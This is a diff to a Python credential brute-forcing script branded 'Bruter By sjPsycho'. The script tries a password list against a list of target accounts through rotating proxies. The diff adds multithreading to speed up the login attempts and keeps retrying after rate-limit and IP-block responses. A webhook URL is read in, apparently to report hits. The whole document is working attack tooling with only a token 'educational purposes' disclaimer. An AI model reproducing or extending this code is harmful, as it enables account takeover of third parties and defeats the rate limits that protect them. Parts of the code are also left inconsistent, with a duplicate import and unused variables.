@@ -1,11 +1,13 @@
 
-from threading import Thread
+import threading
+from time import time
 import requests
 from bs4 import BeautifulSoup
 import uuid
 from colorama import Fore, init
 import os
 from art import *
+import time
 
 os.system('title $React ~ Made for educational purposes only. (Fuck Society)')
 
@@ -60,13 +62,13 @@ def post(targ, passLogin, Proxy):
             print(f'[$] Password: {passLogin} == Incorrect!')
             ifPasswCheckInt += 1
         elif("AccountHitRateLimit" in lib):
-            print("[" + Fore.LIGHTMAGENTA_EX + '%' + Fore.RESET + '] Account Hit Rate Limit, Trying Again.')
+            print("[-] Account Hit Rate Limit, Trying Again.")
             ifPasswCheckInt += 1
         elif("rate_limit_error" in lib):
-            print("[" + Fore.LIGHTMAGENTA_EX + '%' + Fore.RESET + '] Account Hit Rate Limit, Trying Again.')
+            print("[-] Account Hit Rate Limit, Trying Again.")
             ifPasswCheckInt += 1
         elif("RleLoginBlocked" in lib):
-            print('[' + Fore.LIGHTRED_EX + '&' + Fore.RESET + '] ReLoginBlocked.')
+            print("[-] IP Block")
             ifPasswCheckInt += 1
         else:
             print(f'[Error] Log In @{targ} Failed || Response Code: {response.status_code}')
@@ -102,6 +104,8 @@ len = passwords.__len__()
 with open('data/webhook.txt') as u:
     webhookUrl = u.readline()
 
+nWorkers = input('Amount of threads: ')
+
 clear()
 
 print('Starting Bruter By sjPsycho || SJ#0008 || Computer Murderers.')
@@ -112,30 +116,30 @@ print('Press enter to continue...')
 input('')
 print('\n')
 
-#threads = []
+threads = []
 ifPasswCheckInt = 0
 attemptCounter = 0
 a = 0
 r = 0
 print()
-for passW in passwords:
-    for user in targets_list:
-        try:
 
-            session = requests.Session()
+for n in range(int(nWorkers)):
+    for passW in passwords:
+        for user in targets_list:
+            try:
 
-            post(user, passW, proxy_list[r])
-            os.system('title [SJ] R/s: ' + str(attemptCounter) + " // Account #" + str(a))
-            a += 1
-            r += 1
-        except Exception as S:
-            print(S)
-            continue
+                session = requests.Session()
 
+                t = threading.Thread(target=post, args=(user, passW, proxy_list[r]))
+                #threads.append(t)
+                t.start()
+                os.system('title [SJ] R/s: ' + str(attemptCounter) + " // Account #" + str(a))
+                a += 1
+                r += 1
+                #time.sleep(5)
+            except Exception as S:
+                print(S)
+                continue
 # Threading
-"""for n in range(int(nWorkers)):
-    t = threading.Thread(target=post, args=(user, passwords[i], proxy_list[r]))
-    threads.append(t)
-    t.start()
-for process in threads:
+"""for process in threads:
     process.join()"""
